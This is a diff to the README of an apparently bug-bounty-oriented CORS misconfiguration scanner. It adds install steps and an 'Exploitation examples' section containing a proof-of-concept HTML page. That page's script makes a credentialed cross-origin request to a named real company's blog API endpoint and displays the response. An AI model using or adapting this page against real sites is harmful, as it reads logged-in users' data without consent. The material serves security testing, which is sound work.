@@ -7,9 +7,12 @@
 ```
 git clone https://github.com/hariharan005/CORS.git     
 ls    
-cd CORS    
+cd CORS
+sudo pip3 install -r requirements.txt    
 python3 cors.py
 ```
+### Python Version:
+* Python 3 (3.x.x) latest version
 
 ### How to Use CORS-Finder:
 
@@ -29,3 +32,61 @@ If the header returns the
 Note: Not all the time its seems vulnerable, you have to check with cors payload and in the authenticated manner also. Try to exploit and this tool is only for indentifying the vulnerable domain
 
 Note: In this tool i used sample domain file but you have to choose your own url file which you recon using some other recon tool.
+
+
+### Exploitation examples:
+
+Here is the Example code for exploiting the CORS misconfiguration:
+
+```
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]>      <html class="no-js"> <![endif]-->
+<html>
+    <title>Cors POC</title>
+    <style>
+        body{
+            background-color: white;
+            justify-content: center;
+        }
+        button{
+            justify-content: center;
+            align-items: center;
+            color: white;
+            border-radius: 8px;
+            font-size: 18px;
+            background-color: #6437A0;
+            position: relative;
+            width: 10%;
+            height: 50px;
+            display: grid;
+        }
+    </style>
+     <body>
+         <h1>CORS PoC by @crypto_grapper_</h1><span><h2>Hariharan.C</h2></span>
+         <div id="demo">
+                <button type="button" onclick="cors()" >Wp-json Exploit</button>
+            </div>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://www.salesforce.com/blog/wp-json/", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+             setTimeout(() => {
+                document.location.reload("#");
+             }, 5000);
+         </script>
+     </body>
+ </html>
+```
